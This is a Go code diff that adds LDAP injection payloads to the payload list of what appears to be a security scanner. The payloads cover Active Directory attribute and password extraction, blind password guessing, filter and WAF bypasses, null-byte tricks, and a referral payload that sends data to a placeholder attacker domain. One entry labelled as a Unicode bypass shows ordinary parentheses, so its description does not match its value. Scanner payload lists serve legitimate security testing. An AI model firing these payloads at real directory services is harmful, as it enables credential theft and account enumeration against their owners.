@@ -48,6 +48,36 @@ var payloads = []Payload{
 	{Value: "%2a%29%28%7c%28uid%3d%2a%29", Type: TypeFilterBypass, Description: "URL encoded filter bypass", WAFBypass: true},
 	{Value: "%2a%29%28%26", Type: TypeFilterBypass, Description: "URL encoded AND bypass", WAFBypass: true},
 	{Value: "admin%29%28%21%28%26%281%3d0%29%29%29", Type: TypeBoolBased, Description: "URL encoded boolean", WAFBypass: true},
+
+	// --- HackTricks / PayloadAllTheThings LDAP expansion ---
+
+	// AD-specific attribute extraction
+	{Value: "*)(userPassword=*)", Type: TypeFilterBypass, Description: "userPassword attribute extract"},
+	{Value: "*)(sAMAccountName=*)", Type: TypeFilterBypass, Description: "AD sAMAccountName extract"},
+	{Value: "*)(memberOf=*)", Type: TypeFilterBypass, Description: "Group membership enum"},
+	{Value: "*)(distinguishedName=*)", Type: TypeFilterBypass, Description: "DN extract"},
+	{Value: "*)(objectGUID=*)", Type: TypeFilterBypass, Description: "Object GUID extract"},
+	{Value: "*)(servicePrincipalName=*)", Type: TypeFilterBypass, Description: "AD SPN enum (Kerberoast surface)"},
+
+	// Blind boolean enumeration — letter-by-letter via inequality
+	{Value: "admin)(userPassword=A*", Type: TypeBoolBased, Description: "Blind: userPassword starts with A"},
+	{Value: "admin)(userPassword=a*", Type: TypeBoolBased, Description: "Blind: userPassword starts with a (case)"},
+	{Value: "admin)(cn>=A", Type: TypeBoolBased, Description: "Blind: cn ordinal >= A"},
+
+	// Logical-operator alternates
+	{Value: "*)(!(uid=admin)", Type: TypeFilterBypass, Description: "NOT-admin filter (enumerate non-admins)"},
+	{Value: "*)(|(uid=admin)(uid=root))", Type: TypeFilterBypass, Description: "OR multi-user filter"},
+	{Value: "*))(|(cn=*", Type: TypeFilterBypass, Description: "Trailing OR open paren"},
+	{Value: "*))%00", Type: TypeFilterBypass, Description: "Null-byte filter terminator"},
+
+	// LDAP referral exfiltration (kept here since the payload itself
+	// is an LDAP filter; the ${jndi:...} variants live in payloads/jndi/).
+	{Value: "*)(|(ref=ldap://ATTACKER_DOMAIN/cn=hi,dc=com))", Type: TypeFilterBypass, Description: "LDAP referral exfil via |(ref=...)"},
+
+	// Encoding variants
+	{Value: "%5c00", Type: TypeErrorBased, Description: "URL-encoded \\00 null", WAFBypass: true},
+	{Value: "%5c%2a", Type: TypeWildcard, Description: "URL-encoded \\*", WAFBypass: true},
+	{Value: "*(cn=*)", Type: TypeFilterBypass, Description: "Unicode parentheses bypass", WAFBypass: true},
 }
 
 // ErrorPatterns are LDAP error patterns to look for in responses.
